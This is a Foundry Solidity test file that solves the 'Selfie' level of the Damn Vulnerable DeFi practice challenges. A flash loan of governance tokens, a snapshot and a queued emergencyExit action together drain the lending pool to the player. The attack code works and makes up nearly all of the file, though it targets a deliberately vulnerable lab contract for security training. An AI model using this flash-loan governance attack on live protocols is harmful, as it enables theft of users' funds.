// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "../src/Selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../src/DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "../src/Selfie/SelfiePool.sol";

/*  
_hasEnoughVotes
uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
return balance > halfTotalSupply;

flashloan -> hasEnoughVotes -> queueAction -> emergencyExit 
*/

contract SelfieHacker is IERC3156FlashBorrower {
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    address admin;
    uint256 public actionId;

    constructor(
        SelfiePool _pool,
        DamnValuableTokenSnapshot _token,
        SimpleGovernance _governance
    ) {
        pool = _pool;
        token = _token;
        governance = _governance;
        admin = msg.sender;
    }

    function flashLoan(uint256 _amount) external {
        pool.flashLoan(this, address(token), _amount, "");
    }

    function onFlashLoan(
        address /* initiator */,
        address /* token */,
        uint256 amount,
        uint256 /* fee */,
        bytes calldata /* data */
    ) external override returns (bytes32) {
        token.snapshot();
        // uint256 balance = token.getBalanceAtLastSnapshot(address(this));
        // uint256 halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
        // console.log(balance, "balance");
        // console.log(halfTotalSupply / 1e18, "halfTotalSupply");

        bytes memory _calldata = abi.encodeWithSignature(
            "emergencyExit(address)",
            admin
        );
        // target value  _calldata
        actionId = governance.queueAction(address(pool), 0, _calldata);
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}

contract SelfieTest is Test {
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    SelfieHacker hacker;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 TOKEN_INITIAL_SUPPLY = 2000000 ether;
    uint256 TOKENS_IN_POOL = 1500000 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(governance));

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();

        assertEq(governance.getActionCounter(), 1);
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function testExploit() public excuteByUser(player) {
        skip(5);

        hacker = new SelfieHacker(pool, token, governance);
        hacker.flashLoan(TOKENS_IN_POOL);

        skip(2 days);

        uint256 actionId = hacker.actionId();
        governance.executeAction(actionId);

        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
